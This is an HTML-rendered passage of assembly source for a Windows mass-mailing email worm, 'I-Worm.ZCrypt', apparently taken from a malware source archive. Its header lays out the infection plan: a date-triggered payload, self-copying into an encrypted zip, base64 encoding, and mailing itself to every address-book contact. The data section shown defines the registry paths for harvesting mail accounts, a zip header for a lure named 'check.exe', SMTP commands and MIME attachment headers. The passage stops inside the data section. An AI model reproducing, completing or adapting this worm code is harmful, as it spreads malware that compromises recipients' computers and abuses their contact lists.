<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Zircon.a - zcrypt.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;;  I-Worm.ZCrypt</span><span class="sc0">
</span><span class="sc1">;;;                       by BlackArt</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;  Feature:</span><span class="sc0">
</span><span class="sc1">;;;   - Send exe(myself) or encrypted zip file(myself).</span><span class="sc0">
</span><span class="sc1">;;;   - Has funny payload. (Thursday)</span><span class="sc0">
</span><span class="sc1">;;;  </span><span class="sc0">
</span><span class="sc1">;;;  -----------------------------</span><span class="sc0">
</span><span class="sc1">;;;   0. check local time for payload</span><span class="sc0">
</span><span class="sc1">;;;   1. create encrypted zip file</span><span class="sc0">
</span><span class="sc1">;;;   2. encode encrypted zip file and itself to base64</span><span class="sc0">
</span><span class="sc1">;;;   3. get M$ address book info and spread</span><span class="sc0">
</span><span class="sc1">;;;  ------------------------------</span><span class="sc0">

</span><span class="sc1">;;;  Japanese Description:</span><span class="sc0">
</span><span class="sc1">;;;   自分自身、または暗号化ZIP化した自分自身をM$アドレス帳すべてに送る。</span><span class="sc0">
</span><span class="sc1">;;;   発病が楽しい。</span><span class="sc0">
</span><span class="sc1">;;;   あとは前のワームと同じ（いくつかバグ修正してある）</span><span class="sc0">

    </span><span class="sc2">.586p</span><span class="sc0">
    </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
    </span><span class="sc5">locals</span><span class="sc0">
    </span><span class="sc5">jumps</span><span class="sc0">
    
</span><span class="sc5">callW</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">    </span><span class="sc5">@@@x</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">@@@x</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@@x</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">

</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">by</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

</span><span class="sc5">AF_INET</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SOCK_STREAM</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">MEM_RESERVE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00002000h</span><span class="sc0">
</span><span class="sc5">MEM_COMMIT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">SM_CXSCREEN</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SM_CYSCREEN</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">rdtsc</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">310fh</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">CRLF</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">thisfilename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">hfile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  file handle</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  file size</span><span class="sc0">

</span><span class="sc5">b64thisfile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  ptr to buffer to store b64 encoded file</span><span class="sc0">

</span><span class="sc5">hvmem</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">temp</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;  temporary buffer</span><span class="sc0">

</span><span class="sc5">r_seed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">98234399h</span><span class="sc0">       </span><span class="sc1">;  random seed</span><span class="sc0">

</span><span class="sc5">hmfile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hmmap</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">hmmapview</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">str_SMInternetAccountManager</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Software\Microsoft\Internet Account Manager'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMIAccounts</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc13">'Software\Microsoft\Internet Account Manager\Accounts\'
</span><span class="sc5">AccountIdx</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;  account index</span><span class="sc0">
</span><span class="sc5">bufsiz_accountidx</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc1">;  size</span><span class="sc0">
    
</span><span class="sc5">str_DMA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Default Mail Account'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMTPNAME</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SMTP Server'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMTPEmailAddr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SMTP Email Address'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">str_SMWab4</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Software\Microsoft\WAB\WAB4\Wab File Name'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">SMTP_Server</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;  default smtp server</span><span class="sc0">
</span><span class="sc5">bufsiz_SMTPSERVER</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
</span><span class="sc5">morons_Mailaddr</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  mail address of moron :)</span><span class="sc0">
</span><span class="sc5">bufsiz_morons_mailaddr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">wab4_path</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;  wab file path</span><span class="sc0">
</span><span class="sc5">bufsiz_wab4_path</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">target_mailaddr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">sockaddr_in</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">sin_family</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_port</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_addr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">sin_zero</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">len_sockaddr_in</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">

</span><span class="sc5">sock</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;  socket descriptor</span><span class="sc0">

</span><span class="sc5">recv_buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  recv buffer</span><span class="sc0">

</span><span class="sc5">zip_filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'666.zip'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;  temporary zip file name</span><span class="sc0">
</span><span class="sc5">zipfilepath</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  full path of zip file</span><span class="sc0">
</span><span class="sc5">b64zippedfile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;;;  zip stuff</span><span class="sc0">
</span><span class="sc5">local_header</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04034b50h</span><span class="sc0">       </span><span class="sc1">;  sig</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8c28h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">28e4h</span><span class="sc0">
</span><span class="sc5">lh_crc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lh_compressed_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lh_uncompressed_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0">           </span><span class="sc1">;  len of file name</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'check.exe'</span><span class="sc0">
</span><span class="sc5">len_local_header</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">local_header</span><span class="sc0">

</span><span class="sc5">central_header</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">02014b50h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8c28h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">28e4h</span><span class="sc0">
</span><span class="sc5">ch_crc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ch_compressed_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ch_uncompressed_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0">           </span><span class="sc1">;  len of file name</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'check.exe'</span><span class="sc0">
</span><span class="sc5">len_central_header</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">central_header</span><span class="sc0">

</span><span class="sc5">end_ch_directory</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">06054b50h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">len_central_header</span><span class="sc0">
</span><span class="sc5">ecd_central_dir</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">len_local_header</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">len_ch_directory</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">end_ch_directory</span><span class="sc0">

</span><span class="sc5">smtp_zip_password</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Password: '</span><span class="sc0">
</span><span class="sc5">cipher_key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'xxxxxxxx'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">len_cipher_key</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">key0</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">305419896</span><span class="sc0">
</span><span class="sc5">key1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">591751049</span><span class="sc0">
</span><span class="sc5">key2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">878082192</span><span class="sc0">

</span><span class="sc5">crc_init</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0ffffffffh</span><span class="sc0">

</span><span class="sc5">archive_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">byte_to_crc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">jflag</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;  japanese or not</span><span class="sc0">

</span><span class="sc5">smtp_HELO</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HELO localhost'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_HELO</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_HELO</span><span class="sc0">
</span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MAIL FROM: '</span><span class="sc0">
</span><span class="sc5">len_smtp_MAIL_FROM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">
</span><span class="sc1">;crlf</span><span class="sc0">
</span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RCPT TO: '</span><span class="sc0">
</span><span class="sc5">len_smtp_RCPT_TO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">
</span><span class="sc1">;crlf</span><span class="sc0">
</span><span class="sc5">smtp_DATA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_DATA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_DATA</span><span class="sc0">
</span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FROM: '</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_FROM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">
</span><span class="sc5">smtp_BODY_TO</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'TO: '</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_TO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_TO</span><span class="sc0">
</span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'SUBJECT: Important'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_BODY_SUBJECT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">

</span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_DOT_CRLF</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">
</span><span class="sc5">smtp_QUIT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_QUIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_QUIT</span><span class="sc0">

</span><span class="sc5">smtp_crlf</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">

</span><span class="sc5">smtp_MIME_h</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: multipart/mixed; boundary="Boundary-fuck"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--Boundary-fuck'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: text/plain; charset=iso-2022-jp'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: 7bit'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Description: Mail message body'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_MIME_h</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_h</span><span class="sc0">

</span><span class="sc5">smtp_MIME_exe</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">            </span><span class="sc1">;  text</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--Boundary-fuck'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: application/x-msdownload; name="check.exe"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Disposition: attachment;  filename="check.exe"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: BASE64'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
